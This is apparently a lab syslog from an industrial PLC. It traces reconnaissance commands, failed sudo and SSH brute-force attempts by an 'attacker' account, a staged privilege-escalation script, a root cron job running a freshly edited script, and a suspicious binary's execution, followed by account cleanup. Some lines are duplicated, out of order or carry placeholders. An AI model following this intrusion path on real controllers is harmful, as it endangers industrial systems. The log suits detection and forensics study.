+Aug 24 23:08:07 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069579296   LoadSettings settingsPath=/etc/plcnext/device/Services/Ehmi/ehmi.settings, exists=true
+Aug 24 23:08:07 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 3069579296   Initialize FastcgiConnectionPoint=unix:/var/tmp/ehmi/ehmi.socket
+Aug 24 23:08:08 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 2561188672    Starting ThreadID=2561188672, Name=RcfFastCgiServer, cpuAffinity=0x0001
+Aug 24 23:08:08 axcf2152 Arp.System.Application: Arp.Services.ProfiCloudV3.Internal.ProfiCloudV3Manager ERROR - Failed to subscribe to ISoftwareUpdateService.
+Aug 24 23:08:08 axcf2152 Arp.System.Application: Arp.Services.ProfiCloudV3.Internal.ProfiCloudV3Manager INFO - Publish IProfiCloudV3Service
+Aug 24 23:08:08 axcf2152 Arp.System.Application: Arp.System.Um.UserManager INFO - UM ldap configuration not found, disable ldap support completely
+Aug 24 23:08:10 axcf2152 Arp.System.Application: Arp.System.Lm.Internal.LicenseManager INFO - License runtime version: 2.50.1806
+Aug 24 23:08:10 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.Project.PlcProjectManager INFO - Project integrity check configured with mode 'Warning'
+Aug 24 23:08:10 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'None' to 'Ready'
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Plc.Esm.Internal.EsmDomain INFO - ESM configuration successfully loaded.
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxiolineDomain INFO - Axioline: No bus configuration found. No links.xml file.
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - LoadPlc, isChanging=false
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Plc.Gds.Internal.GdsDomain INFO - GDS configuration successfully loaded.
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.Config.PlcConfigManager INFO - Loading project 'PLC1_Application_datalogger'
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Plc.Esm.Internal.TaskManager INFO - Configuring Sleep class with a sync point interval of 100000us, an watchdog interval of 100000us and an axio interval of 100000us
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Io.Axioline.AxiolineComponent INFO - AxiolineComponent: SetupPlc(False): No config, Reset Bus
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - SetupPlc, isChanging=false, startKind=Warm
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 OnPlcLoaded PlcLoaded=false
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 ESDK 0xffff, AddAssemblies, toInstanceID=110, toSize=256, otInstanceID=100, otSize=256
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Plc.Gds.Internal.GdsDomain INFO - GDS data connections successfully created.
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'Ready' to 'Stop|Warm'
+Aug 24 23:08:11 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent WARN - 3069579296   ReloadStrings . Empty project id.
+Aug 24 23:08:11 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 3069579296    TypeDictionary->Load() failure!!!
+Aug 24 23:08:11 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 3069579296   Load Cannot read fileName=data.dictionary.json
+Aug 24 23:08:11 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 3069579296    DataDictionary->Load() failure!!!
+Aug 24 23:08:12 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - Enabling installation Mode
+Aug 24 23:08:12 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - Installation Mode enabled
+Aug 24 23:08:12 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - Checking active apps licenses
+Aug 24 23:08:12 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - Disabling installation Mode
+Aug 24 23:08:12 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - Installation Mode disabled
+Aug 24 23:08:12 axcf2152 Arp.System.Application: Arp.Services.Wcm.WebConfigurationManager INFO - Identity Store HTTPS-self-signed was created/loaded successfully
+Aug 24 23:08:12 axcf2152 Arp.System.Application: Arp.Services.Wcm.WebConfigurationManager INFO - Setuped self-signed Identity Store
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Arp.Services.Modules.Wbm.Splc.Internal.SplcHandler INFO - Could not subscribe ISpnsProxyConfigService. SPLC WBM request handler will not be available
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Device Info: article name AXC F 2152, article number 2404267, serial number 1368735890, firmware version 2022.9.0 (22.9.0.33), hardware version 04, fpga version 1.1.80
+Aug 24 23:08:14 axcf2152 Arp.System.Application: External SD Card. Boot Device: internalSD, State: activated
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Configured IP Addresses: Interface number 1 Ip Address 192.168.137.10
+Aug 24 23:08:14 axcf2152 Arp.System.Application: NTP servers config. Servers Hostnames: 
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Firewall run status is Stopped, activation status is Deactivated, active tables: name:filter, family:ip
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Security Profile status: Deactivated
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Installed Apps: []
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Identity Store for HTTPS certificate: HTTPS-self-signed, Given Identity Store for HTTPS certificate: HTTPS-self-signed,Self-signed certificate Identity Store HTTPS-self-signed, Cipher Suites Set: DefaultCiphers, TLS Versions: TLSv1.2;TLSv1.3
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.Condition.PlcConditionManager INFO - Starting Plc is delayed by 'Arp.Services.SystemEvents' because of 'Complete system start'. Timeout is set to 0 milliseconds.
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'Stop|Warm' to 'Stop|Warm|StartingDelayed'
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Arp.Device.Interface.DeviceInterface INFO - Thread DI.UpdateSystemVariables is running
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Arp.Device.Interface.Internal.MonitorThreads INFO - Thread DI.LowPrioMonitor is running
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Arp.Services.PLCnextStore.Internal.PLCnextStoreService INFO - Will not start PLCnext-Store service. It is disabled via service settings.
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Link state changed: interface 1, port 2, status Up
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069579296   Start 
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Arp.Services.OpcUAServer.Internal.Config.OpcUAConfigManager INFO - Using the self-signed certificate.
+Aug 24 23:08:14 axcf2152 Arp.System.Application: Arp.Services.OpcUAServer.Internal.InformationModel.Common.SampleGroupManager INFO - SubscriptionKind is set to DirectRead
+Aug 24 23:08:15 axcf2152 sudo: plcnext_firmware : PWD=/var/volatile/tmp ; USER=root ; COMMAND=/usr/sbin/watchdog --config-file /opt/plcnext/data/System/Watchdog/WatchdogDaemon.config
+Aug 24 23:08:15 axcf2152 watchdog[29640]: starting daemon (5.16):
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  int=1s realtime=yes sync=no load=0,0,0 soft=no
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  memory not checked
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  ping: no machine to check
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  file: no file to check
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  pidfile: /opt/plcnext/data/System/Watchdog/mainProcess.pid
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  pidfile: /opt/plcnext/data/System/Watchdog/ExternalIoProcess.pid
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  pidfile: /opt/plcnext/data/System/Watchdog/LocalIoProcess.pid
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  interface: no interface to check
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  temperature: no sensors to check
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  no test binary files
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  no repair binary files
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  error retry time-out = 0 seconds
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  repair attempts = 1
+Aug 24 23:08:15 axcf2152 watchdog[29640]:  alive=/dev/watchdog1 heartbeat=[none] to=root no_act=no force=no
+Aug 24 23:08:15 axcf2152 watchdog[29640]: cannot set timeout 60 (errno = 95 = 'Operation not supported')
+Aug 24 23:08:15 axcf2152 watchdog[29640]: hardware watchdog identity: Watchdog Driver for axc2152
+Aug 24 23:08:15 axcf2152 Arp.System.Application: OpcServer INFO - OPC UA server opened endpoint URI opc.tcp://axcf2152:4840 listening at opc.tcp://axcf2152:4840
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.Services.OpcUAServer.OpcUAServerComponent INFO - Started OPC UA Server successfully.
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.Services.OpcUAServer.Internal.Security.SessionManager INFO - Applying configuration for client authentication to 1 endpoints: trustAll=true, checkCRLs=false, checkIssuerCRLs=false, ignoreValidity=false
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.Services.ProfiCloudV3.Internal.ProfiCloudV3Manager INFO - Proficloud (V3) service is disabled by configuration and won't start.
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.Services.Grpc.GrpcServerComponent INFO - gRPC Server listening on unix:/run/plcnext/grpc.sock
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.Condition.PlcConditionManager INFO - Plc start delay condition 'Complete system start' expired after 498 ms
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxioDataExchange INFO - AxioDataExchange: PD not enabled Buffer are invalid
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - StartPlc, startKind=Warm
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 OnPlcStarted 
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Retain data saved
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.Services.DataLogger.Internal.Session INFO - Session 'DB_name': Session started logging of 18 variables.
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.Services.DataLogger.Internal.Session INFO - Session 'Sec_log': Session started logging of 27 variables.
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'Stop|Warm|StartingDelayed' to 'Running'
+Aug 24 23:08:15 axcf2152 Arp.System.Application: PLC started. Start Kind: Warm, Used Memory: 97%, CPUs load: (CPU 0: 0 %,CPU 1: 0 %), Temperatures: (Board Temperature: 56.722 C, CPU Temperature: Not available, LastSensor Temperature: Not available)
+Aug 24 23:08:15 axcf2152 Arp.System.Application: CommonRemoting INFO - Starting remoting server (version=4)
+Aug 24 23:08:15 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on TCP port 41100
+Aug 24 23:08:15 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - Application 'MainProcess' was setup successfully.
+Aug 24 23:08:42 axcf2152 root: [2024-08-24 23:08:42] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 23:08:42 axcf2152 root: [2024-08-24 23:08:42] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 23:09:02 axcf2152 root: [2024-08-24 23:09:02] Script Modified: /etc/plcnext/plcnext_users.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 32768 bytes | Last Modified: 2024-08-24 23:08:08.980000000 +0000
+Aug 24 23:09:02 axcf2152 root: [2024-08-24 23:09:02] Script Modified: /etc/plcnext/plcnext_shadow.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 12288 bytes | Last Modified: 2024-08-24 23:08:08.960000000 +0000
+Aug 24 23:09:03 axcf2152 root: [2024-08-24 23:09:02] Script Modified: /etc/plcnext/plcnext_firewall_rules.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 32768 bytes | Last Modified: 2024-08-24 23:08:07.850000000 +0000
+Aug 24 23:09:03 axcf2152 root: [2024-08-24 23:09:03] Script Modified: /opt/plcnext/config/Services/Syslog/Syslog.config | Owner: admin | Group: plcnext | Size: 157 bytes | Last Modified: 2024-08-24 23:08:12.610000000 +0000
+
+Aug 24 23:10:13 axcf2152 sshd[30613]: Connection closed by 192.168.137.246 port 45902 [preauth]
+Aug 24 23:10:50 axcf2152 sshd[30799]: Accepted password for engineer from 192.168.137.246 port 33612 ssh2
+Aug 24 23:10:50 axcf2152 sshd[30799]: pam_unix(sshd:session): session opened for user engineer(uid=5000) by (uid=0)
+Aug 24 23:10:50 axcf2152 bash[30810]: CMD:  | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:10:53 axcf2152 bash[30876]: CMD: ls | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:10:54 axcf2152 bash[30882]: CMD: ls | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:10:54 axcf2152 bash[30888]: CMD: ls | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:10:50 axcf2152 bash[30810]: CMD:  | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:10:53 axcf2152 bash[30876]: CMD: ls | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:10:54 axcf2152 bash[30882]: CMD: ls | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:10:54 axcf2152 bash[30888]: CMD: ls | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:11:28 axcf2152 sshd[31130]: pam_unix(sshd:session): session opened for user engineer(uid=5000) by (uid=0)
+Aug 24 23:11:15 axcf2152 sshd[30801]: Received disconnect from 192.168.137.246 port 33612:11: disconnected by user
+Aug 24 23:11:15 axcf2152 sshd[30801]: Disconnected from user engineer 192.168.137.246 port 33612
+Aug 24 23:11:15 axcf2152 sshd[30799]: pam_unix(sshd:session): session closed for user engineer
+Aug 24 23:11:28 axcf2152 sshd[31130]: Accepted password for engineer from 192.168.137.246 port 60104 ssh2
+Aug 24 23:11:28 axcf2152 sshd[31130]: pam_unix(sshd:session): session opened for user engineer(uid=5000) by (uid=0)
+Aug 24 23:11:28 axcf2152 bash[31171]: CMD:  | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:11:30 axcf2152 bash[31178]: CMD: ls | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:11:36 axcf2152 bash[31244]: CMD: ifconfig | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:11:45 axcf2152 bash[31292]: CMD: arp first | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:11:59 axcf2152 bash[31385]: CMD: arp | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:12:08 axcf2152 bash[31543]: CMD: nft list ruleset | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:12:17 axcf2152 bash[31606]: CMD: cd master/php_app/ | USER: engineer | CWD: /opt/plcnext/master/php_app
+Aug 24 23:12:18 axcf2152 bash[31616]: CMD: ls | USER: engineer | CWD: /opt/plcnext/master/php_app
+Aug 24 23:12:22 axcf2152 bash[31622]: CMD: cd .. | USER: engineer | CWD: /opt/plcnext/master
+Aug 24 23:12:38 axcf2152 sudo: pam_unix(sudo:auth): authentication failure; logname=engineer uid=5000 euid=0 tty=/dev/pts/2 ruser=engineer rhost=  user=engineer
+Aug 24 23:12:42 axcf2152 sudo: pam_unix(sudo:auth): conversation failed
+Aug 24 23:12:42 axcf2152 sudo: pam_unix(sudo:auth): auth could not identify password for [engineer]
+Aug 24 23:12:42 axcf2152 sudo: engineer : command not allowed ; TTY=pts/2 ; PWD=/opt/plcnext/master ; USER=root ; COMMAND=/usr/bin/vim private_file.txt
+Aug 24 23:12:42 axcf2152 bash[31747]: CMD: sudo vim private_file.txt  | USER: engineer | CWD: /opt/plcnext/master
+Aug 24 23:13:15 axcf2152 sshd[31162]: Received disconnect from 192.168.137.246 port 60104:11: disconnected by user
+Aug 24 23:13:15 axcf2152 sshd[31162]: Disconnected from user engineer 192.168.137.246 port 60104
+Aug 24 23:13:15 axcf2152 sshd[31130]: pam_unix(sshd:session): session closed for user engineer
+Aug 24 23:13:22 axcf2152 sshd[32086]: Invalid user attacker from 192.168.137.246 port 34014
+Aug 24 23:13:25 axcf2152 sshd[32086]: pam_unix(sshd:auth): check pass; user unknown
+Aug 24 23:13:25 axcf2152 sshd[32086]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246 
+Aug 24 23:13:27 axcf2152 sshd[32086]: Failed password for invalid user attacker from 192.168.137.246 port 34014 ssh2
+Aug 24 23:13:32 axcf2152 sshd[32086]: pam_unix(sshd:auth): check pass; user unknown
+Aug 24 23:13:34 axcf2152 sshd[32086]: Failed password for invalid user attacker from 192.168.137.246 port 34014 ssh2
+Aug 24 23:13:36 axcf2152 sshd[32086]: Failed password for invalid user attacker from 192.168.137.246 port 34014 ssh2
+Aug 24 23:13:36 axcf2152 sshd[32086]: Connection closed by invalid user attacker 192.168.137.246 port 34014 [preauth]
+Aug 24 23:13:36 axcf2152 sshd[32086]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246 
+Aug 24 23:13:15 axcf2152 sshd[31162]: Received disconnect from 192.168.137.246 port 60104:11: disconnected by user
+Aug 24 23:13:15 axcf2152 sshd[31162]: Disconnected from user engineer 192.168.137.246 port 60104
+Aug 24 23:13:15 axcf2152 sshd[31130]: pam_unix(sshd:session): session closed for user engineer
+Aug 24 23:13:22 axcf2152 sshd[32086]: Invalid user attacker from 192.168.137.246 port 34014
+Aug 24 23:13:25 axcf2152 sshd[32086]: pam_unix(sshd:auth): check pass; user unknown
+Aug 24 23:13:25 axcf2152 sshd[32086]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246 
+Aug 24 23:13:27 axcf2152 sshd[32086]: Failed password for invalid user attacker from 192.168.137.246 port 34014 ssh2
+Aug 24 23:13:32 axcf2152 sshd[32086]: pam_unix(sshd:auth): check pass; user unknown
+Aug 24 23:13:34 axcf2152 sshd[32086]: Failed password for invalid user attacker from 192.168.137.246 port 34014 ssh2
+Aug 24 23:13:36 axcf2152 sshd[32086]: Failed password for invalid user attacker from 192.168.137.246 port 34014 ssh2
+Aug 24 23:13:36 axcf2152 sshd[32086]: Connection closed by invalid user attacker 192.168.137.246 port 34014 [preauth]
+Aug 24 23:13:36 axcf2152 sshd[32086]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246 
+
+Aug 24 23:20:02 axcf2152 bash[32321]: CMD: pwd | USER: engineer | CWD: /opt/plcnext
+Aug 24 23:20:07 axcf2152 bash[32337]: CMD: ls | USER: engineer | CWD: /opt/plcnext 
+Aug 24 23:20:05 axcf2152 bash[32344]: CMD: ssh admin@192.168.137.12 | USER: engineer | CWD: /opt/plcnext
+
+Aug 24 23:22:02 axcf2152 root: [2024-08-24 23:22:02] Script executed: PID=3557, Command=vim, User=root, Args=vim monitor_plc_log.py
+Aug 24 23:23:02 axcf2152 root: [2024-08-24 23:23:02] Script Accessed: /opt/plcnext/master/php_app | Owner: admin | Group: root | Size: 4096 bytes | Last Modified: 2024-08-24 23:22:14.380000000 +0000
+Aug 24 23:23:02 axcf2152 root: [2024-08-24 23:23:02] Script Accessed: /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 23:23:02 axcf2152 root: [2024-08-24 23:23:02] Script Accessed: /opt/plcnext/master/php_app/monitor_plc_log.py | Owner: root | Group: root | Size: 1645 bytes | Last Modified: 2024-08-24 23:22:14.380000000 +0000
+Aug 24 23:24:01 axcf2152 crond[1537]: (*system*) RELOAD (/etc/crontab)
+Aug 24 23:25:02 axcf2152 CROND[5097]: (root) CMDOUT (/usr/bin/python3: can't open file '/opt/plcnext/master/monitor': [Errno 2] No such file or directory)
+Aug 24 23:25:02 axcf2152 CROND[5097]: (root) CMDEND (/usr/bin/python3 /opt/plcnext/master/monitor)
+Aug 24 23:26:01 axcf2152 crond[1537]: (*system*) RELOAD (/etc/cron.d/mycronjob)
+Aug 24 23:26:02 axcf2152 sudo:     root : PWD=/home/root ; USER=root ; COMMAND=/bin/ls -lR /etc/crontab
+Aug 24 23:26:03 axcf2152 CROND[5528]: (root) CMDOUT (Collecting logs)
+Aug 24 23:26:03 axcf2152 sudo:     root : PWD=/home/root ; USER=root ; COMMAND=/bin/ls -lR /etc/cron.d/
+Aug 24 23:26:03 axcf2152 CROND[5528]: (root) CMDEND (/usr/bin/python3 /opt/plcnext/master/monitor_plc_log.py)
+Aug 24 23:26:03 axcf2152 sudo:     root : PWD=/home/root ; USER=root ; COMMAND=/usr/bin/du -sh /etc/cron.d/
+Aug 24 23:26:03 axcf2152 root: [2024-08-24 23:26:03] Script executed: PID=5534, Command=python3, User=, Args=/usr/bin/python3 /opt/plcnext/master/monitor_plc_log.py
+Aug 24 23:26:03 axcf2152 sudo:     root : PWD=/home/root ; USER=root ; COMMAND=/bin/stat -c %y /etc/cron.d/
+Aug 24 23:26:04 axcf2152 root: [2024-08-24 23:26:04] deleted detected in /etc/cron.d/ by user root. File size: 8.0K. Last modified: 2024-08-24 23:25:38.440000000 +0000.
+Aug 24 23:27:01 axcf2152 CROND[6026]: (root) CMD (/usr/bin/python3 /opt/plcnext/master/monitor_plc_log.py)
+Aug 24 23:27:02 axcf2152 CROND[6020]: (root) CMDOUT (Collecting logs)
+Aug 24 23:27:03 axcf2152 CROND[6020]: (root) CMDEND (/usr/bin/python3 /opt/plcnext/master/monitor_plc_log.py)
+Aug 24 23:27:03 axcf2152 root: [2024-08-24 23:27:03] Script executed: PID=6026, Command=python3, User=, Args=/usr/bin/python3 /opt/plcnext/master/monitor_plc_log.py
+Aug 24 23:28:01 axcf2152 crond[1537]: (*system*) RELOAD (/etc/cron.d/mycronjob)
+Aug 24 23:28:02 axcf2152 CROND[6522]: (root) CMD (/usr/bin/python3 /opt/plcnext/master/monitor_plc_log.py)
+Aug 24 23:28:02 axcf2152 sudo:     root : PWD=/home/root ; USER=root ; COMMAND=/bin/ls -lR /etc/crontab
+Aug 24 23:28:03 axcf2152 CROND[6516]: (root) CMDOUT (Collecting logs)
+Aug 24 23:28:03 axcf2152 CROND[6516]: (root) CMDEND (/usr/bin/python3 /opt/plcnext/master/monitor_plc_log.py)
+Aug 24 23:28:03 axcf2152 root: [2024-08-24 23:28:03] Script executed: PID=6522, Command=python3, User=, Args=/usr/bin/python3 /opt/plcnext/master/monitor_plc_log.py
+Aug 24 23:28:03 axcf2152 root: [2024-08-24 23:28:03] deleted detected in /etc/cron.d/ by user root. File size: 8.0K. Last modified: 2024-08-24 23:27:52.060000000 +0000.
+Aug 24 23:29:02 axcf2152 CROND[6946]: (root) CMDOUT (Collecting logs)
+Aug 24 23:29:02 axcf2152 CROND[6946]: (root) CMDEND (/usr/bin/python3 /opt/plcnext/master/monitor_plc_log.py)
+
+Aug 24 23:30:21 axcf2152 bash[2172]: CMD: ./ISRAELI_YAK | USER: admin | CWD: /opt/plcnext/master
+
+Aug 24 23:51:52 axcf2152 Arp.System.Application: User Authentication enabled. Current Security Token: 00000000
+Aug 24 23:51:53 axcf2152 nginx: 192.168.137.50 - - [24/Aug/2024:23:51:53 +0000] "GET /wbm/ProlongSession.cgi?_=1724536331442 HTTP/1.1" 403 5 "https://192.168.137.10/wbm/Main.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" "-"
+Aug 24 23:52:02 axcf2152 Arp.System.Application: Session created. User: engineer, User roles: Admin SecurityAdmin SecurityAuditor , Security Token: 88B071FD, Object name: Wbm, currently opened Sessions 2 
+Aug 24 23:52:02 axcf2152 root: [2024-08-24 23:52:02] Script executed: PID=1494, Command=fibofiled.sh, User=root, Args=/bin/sh /usr/sbin/fibofiled.sh /opt/fibo.ini
+Aug 24 23:52:03 axcf2152 root: [2024-08-24 23:52:02] Script Modified: /etc/plcnext | Owner: root | Group: plcnext_firmware | Size: 4096 bytes | Last Modified: 2024-08-24 23:51:52.910000000 +0000
+Aug 24 23:52:03 axcf2152 root: [2024-08-24 23:52:03] Script Modified: /etc/plcnext/plcnext_users.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 32768 bytes | Last Modified: 2024-08-24 23:51:52.910000000 +0000
+Aug 24 23:52:04 axcf2152 root: [2024-08-24 23:52:03] Script Modified: /etc/plcnext/plcnext_shadow.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 12288 bytes | Last Modified: 2024-08-24 23:51:52.880000000 +0000
+Aug 24 23:52:30 axcf2152 Arp.System.Application: Arp.System.Um.Internal.UserManagement INFO - Passwordchange for user attacker rejected.
+Aug 24 23:52:30 axcf2152 Arp.System.Application: New password for user attacker rejected due to PasswordPolicy from ruleset "admin". Failed check: Password contains too few mixedcase characters
+Aug 24 23:52:51 axcf2152 Arp.System.Application: User attacker removed. Current Security Token: 00000000
+Aug 24 23:52:57 axcf2152 Arp.System.Application: User technicker removed. Current Security Token: 00000000
+Aug 24 23:53:02 axcf2152 root: [2024-08-24 23:53:02] Script Modified: /etc/plcnext/plcnext_users.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 32768 bytes | Last Modified: 2024-08-24 23:52:57.640000000 +0000
+Aug 24 23:53:03 axcf2152 root: [2024-08-24 23:53:02] Script Modified: /etc/plcnext/plcnext_shadow.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 12288 bytes | Last Modified: 2024-08-24 23:52:57.620000000 +0000
+Aug 24 23:53:18 axcf2152 Arp.System.Application: Arp.System.Um.Internal.UserManagement INFO - Passwordchange for user engineer rejected.
+Aug 24 23:53:18 axcf2152 Arp.System.Application: New password for user engineer rejected due to PasswordPolicy from ruleset "admin". Failed check: Password contains too few symbols
+Aug 24 23:53:41 axcf2152 Arp.System.Application: Password changed for User engineer. Security Token: 00000000
+Aug 24 23:54:02 axcf2152 root: [2024-08-24 23:54:02] Script Modified: /etc/plcnext/plcnext_users.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 32768 bytes | Last Modified: 2024-08-24 23:53:41.520000000 +0000
+
+Aug 24 23:54:42 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - PlcManager::StopPlc(stopReason=SystemTerminate,onError=false,onFatalError=false,async=false), current PlcState=Running
+Aug 24 23:54:42 axcf2152 Arp.System.Application: Stopping PLC. Used Memory: 94%, CPUs load: (CPU 0: 24 %,CPU 1: 42 %), Temperatures: (Board Temperature: 56.668 C, CPU Temperature: Not available, LastSensor Temperature: Not available)
+Aug 24 23:54:42 axcf2152 Arp.System.Application: Arp.Services.DataLogger.Internal.Session INFO - Session 'DB_name': Session stopped logging.
+Aug 24 23:54:42 axcf2152 Arp.System.Application: Arp.Services.DataLogger.Internal.Session INFO - Session 'Sec_log': Session stopped logging.
+Aug 24 23:54:42 axcf2152 Arp.System.Application: Retain data saved
+Aug 24 23:54:42 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - StopPlc
+Aug 24 23:54:42 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 OnPlcStopped 
+Aug 24 23:54:42 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxioDataExchange INFO - AxioDataExchange: PD disabled
+Aug 24 23:54:42 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'Running' to 'Stop|Hot'
+Aug 24 23:54:42 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - Application 'MainProcess' terminates.
+Aug 24 23:54:43 axcf2152 nginx: 2024/08/24 23:54:43 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:43 axcf2152 Arp.System.Application: Session with security Token 88B071FD was closed , currently are 1 sessions active
+Aug 24 23:54:43 axcf2152 Arp.System.Application: Arp.Services.OpcUAServer.OpcUAServerComponent INFO - Stopped OPC UA Server successfully.
+Aug 24 23:54:43 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069579296   Stop 
+Aug 24 23:54:43 axcf2152 Arp.System.Application: Arp.Services.PLCnextStore.Internal.PLCnextStoreAdapter INFO - Stopped PLCnext-Store service
